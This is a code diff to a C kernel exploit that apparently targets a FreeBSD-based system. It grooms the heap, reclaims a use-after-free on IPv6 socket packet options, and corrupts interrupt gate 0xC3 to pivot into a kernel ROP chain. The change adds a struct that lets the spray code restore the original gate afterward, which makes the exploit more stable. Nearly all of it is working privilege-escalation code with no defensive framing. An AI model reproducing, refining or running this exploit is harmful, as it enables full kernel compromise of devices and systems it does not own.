@@ -33,7 +33,7 @@
 #define HEAP_GROOM_COUNT 100
 #define MAX_TRIES 500
 #define UAF_RECLAIM_TRIES (MAX_TRIES * 2)
-#define CLOSEUP_ARRAY_SIZE (SPRAY_TOTAL + (2 * MAX_ATTEMPTS) + 2 + 1) // = 256 + 10 + 2 + 1 = 269
+#define CLOSEUP_ARRAY_SIZE (SPRAY_TOTAL + (2 * MAX_ATTEMPTS) + 2 + 1) // = 269
 
 #define DEFRAG_PASSES 3
 #define DEFRAG_SMALL_SOCKETS 16
@@ -49,14 +49,45 @@
 #define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
 #define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
 
-// Dynamic socket cache
+/* Dynamic socket cache */
 #define SOCKET_CACHE_SIZE (DEFRAG_PASSES * (DEFRAG_SMALL_SOCKETS + DEFRAG_LARGE_SOCKETS))
 
 static int socket_cache[SOCKET_CACHE_SIZE];
 static int socket_cache_count = 0;
 static int socket_cache_initialized = 0;
 
-// Start socket cache with -1
+/* ============================================================
+ *  Struct passed to spray.asm via the 1st argument of
+ *  rop_call_funcptr. The kernel reads the struct directly through
+ *  the pointer. The extra fields are used by spray.asm at the
+ *  end to restore gate 0xC3 on the last call.
+ *
+ *  Layout (must match the %define directives in spray.asm):
+ *     fds[269]     : offset 0     (269*4 = 1076 bytes)
+ *     pad          : offset 1076
+ *     restore_flag : offset 1080
+ *     idt_base     : offset 1088
+ *     gate_lo      : offset 1096
+ *     gate_hi      : offset 1104
+ * ============================================================ */
+struct spray_data {
+    int      fds[CLOSEUP_ARRAY_SIZE];
+    uint32_t pad;
+    uint64_t restore_flag;
+    uint64_t idt_base;
+    uint64_t gate_lo;
+    uint64_t gate_hi;
+};
+typedef char spray_data_assert1[(offsetof(struct spray_data, restore_flag) == 1080) ? 1 : -1];
+typedef char spray_data_assert2[(offsetof(struct spray_data, idt_base)     == 1088) ? 1 : -1];
+typedef char spray_data_assert3[(offsetof(struct spray_data, gate_lo)      == 1096) ? 1 : -1];
+typedef char spray_data_assert4[(offsetof(struct spray_data, gate_hi)      == 1104) ? 1 : -1];
+
+/* Snapshot of the original gate 0xC3, saved in the exploit loop */
+static uint64_t g_gate_lo = 0;
+static uint64_t g_gate_hi = 0;
+static int      g_gate_saved = 0;
+
 void init_socket_cache(void)
 {
     if (socket_cache_initialized) return;
@@ -82,21 +113,17 @@ void safe_close_socket(int sock) {
     }
 }
 
-// Use socket cache if available
 int fast_new_socket(void) {
     if (socket_cache_count > 0) {
         int sock = socket_cache[--socket_cache_count];
         socket_cache[socket_cache_count] = -1;
         return sock;
     }
-
     return NEW_SOCKET();
 }
 
-// Store socket cache
 void cache_socket(int sock) {
     if (sock < 0) return;
-
     if (socket_cache_count < SOCKET_CACHE_SIZE) {
         socket_cache[socket_cache_count++] = sock;
     } else {
@@ -126,8 +153,6 @@ int get_pktinfo(int s, char* buf) {
     return getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l) ? (*(volatile int*)0) : l;
 }
 
-// Dirty socket (shares in6p_outputopts with master via UAF): never cache,
-// never close, never reuse. Drop the FD; kernel reclaims it on exit.
 static inline void refrain_from_caching(int sock) {
     (void)sock;
 }
@@ -164,7 +189,6 @@ void cleanup_on_failure(exploit_state_t* state) {
     nanosleep(NANOSLEEP_100US, NULL);
 }
 
-
 void drain_socket_cache(void) {
     while (socket_cache_count > 0) {
         int s = socket_cache[--socket_cache_count];
@@ -190,7 +214,6 @@ void pin_to_cpu(int cpu) {
     CPU_SET(cpu, &set);
     cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
 }
-
 
 void* use_thread(void* arg) {
     struct opaque* o = (struct opaque*)arg;
@@ -359,7 +382,6 @@ void targeted_heap_defragmentation(void) {
             }
         }
 
-
         for (int i = 0; i < DEFRAG_LARGE_SOCKETS; i++) {
             defrag_large[i] = fast_new_socket();
             if (defrag_large[i] >= 0) {
@@ -368,7 +390,6 @@ void targeted_heap_defragmentation(void) {
         }
 
         nanosleep(NANOSLEEP_10US, NULL);
-
 
         for (int i = DEFRAG_LARGE_SOCKETS - 1; i >= 0; i--) {
             if (defrag_large[i] >= 0) {
@@ -519,7 +540,15 @@ int main() {
             *(volatile int*)0;
 
         char buf[32];
+        char orig[20];         /* Snapshot of original gate 0xC3 BEFORE corrupting buf */
         get_pktinfo(master_sock, buf);
+        for (int i = 0; i < 20; i++) orig[i] = buf[i];
+
+        if (!g_gate_saved) {
+            g_gate_lo = *(uint64_t*)(orig + 4);
+            g_gate_hi = *(uint64_t*)(orig + 12);
+            g_gate_saved = 1;
+        }
 
         uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
 
@@ -527,6 +556,7 @@ int main() {
         *(uint64_t*)(buf + 10) = entry_gadget >> 16;
         buf[9] = 0xee;
 
+        // Preserve the CORRUPTED bytes (required for enter_krop)
         krop_c3bak1 = *(uint64_t*)(buf + 4);
         krop_c3bak2 = *(uint64_t*)(buf + 12);
         krop_ud1 = *(uint64_t*)(buf + 4);
@@ -541,21 +571,26 @@ int main() {
         break;
     }
 
-    int closeup_fds[CLOSEUP_ARRAY_SIZE];
+    static struct spray_data sd;
 
     for (int i = 0; i < CLOSEUP_ARRAY_SIZE; i++)
-        closeup_fds[i] = spray_sock[0];
+        sd.fds[i] = spray_sock[0];
 
     int closeup_count = 0;
 
     for (int i = 0; i < SPRAY_TOTAL; i++)
-        closeup_fds[closeup_count++] = spray_sock[i];
+        sd.fds[closeup_count++] = spray_sock[i];
 
     for (int i = 0; i < dirty_count; i++)
-        closeup_fds[closeup_count++] = dirty_fds[i];
+        sd.fds[closeup_count++] = dirty_fds[i];
 
-    closeup_fds[closeup_count++] = master_sock;
-    closeup_fds[closeup_count++] = kevent_sock;
+    sd.fds[closeup_count++] = master_sock;
+    sd.fds[closeup_count++] = kevent_sock;
+
+    sd.restore_flag = 0;
+    sd.idt_base     = idt_base;
+    sd.gate_lo      = g_gate_lo;
+    sd.gate_hi      = g_gate_hi;
 
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
@@ -574,24 +609,27 @@ int main() {
 
     if (exploit_success) {
         pin_to_cpu(2);
-        rop_call_funcptr(spray_map, closeup_fds, kernel_base);
+        rop_call_funcptr(spray_map, sd.fds, kernel_base);
 
         for (int cpu = 3; cpu <= 7; cpu++) {
             pin_to_cpu(cpu);
-            rop_call_funcptr(spray_map, NULL, kernel_base);
+            if (cpu == 7 && g_gate_saved)
+                sd.restore_flag = 1; // Enable restoration of gate 0xC3 for full stability post-exploit
+
+            rop_call_funcptr(spray_map, sd.fds, kernel_base);
         }
 
         nanosleep(NANOSLEEP_50US, NULL);
     } else {
         if (dirty_count > 0) {
             pin_to_cpu(2);
-            rop_call_funcptr(spray_map, closeup_fds, kernel_base);
+            rop_call_funcptr(spray_map, sd.fds, kernel_base);
         } else {
             cleanup_on_failure(&cleanup_state);
         }
     }
-	
-	drain_socket_cache();
+
+    drain_socket_cache();
 
     return exploit_success ? 0 : 1;
 }
